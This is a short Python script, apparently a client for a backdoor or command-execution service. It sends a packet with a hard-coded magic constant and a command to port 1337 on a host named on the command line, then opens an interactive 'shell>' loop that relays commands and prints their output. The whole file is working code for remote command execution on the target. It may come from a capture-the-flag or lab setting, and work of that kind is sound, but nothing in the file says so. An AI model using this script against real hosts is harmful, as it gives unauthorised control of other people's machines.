import sys
import struct
import socket

MAGIC = 0x48A9B2F1E3C47058

s = socket.socket()

command = sys.argv[2]
size = len(command)
payload = struct.pack(f'>QQQ', MAGIC, 4, size) + command.encode('ascii')

print(command)
s.connect((sys.argv[1], 1337))

s.sendall(payload)

def receive_response(sock, timeout=1.0):
    """Receive available response data until the connection is idle."""
    sock.settimeout(timeout)
    chunks = []

    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break

    return b"".join(chunks).decode("utf-8", errors="replace")

print("Type 'exit' to disconnect.")

# Read any initial server banner or prompt.
response = receive_response(s)
if response:
    print(response, end="", flush=True)

while True:
    try:
        command = input("shell> ")
    except (EOFError, KeyboardInterrupt):
        print()
        break

    if command.strip().lower() == "exit":
        break

    if not command:
        continue

    # Assumes the server accepts newline-terminated commands.
    s.sendall((command + "\n").encode("utf-8"))

    response = receive_response(s)
    if response:
        print(response, end="", flush=True)

s.close()
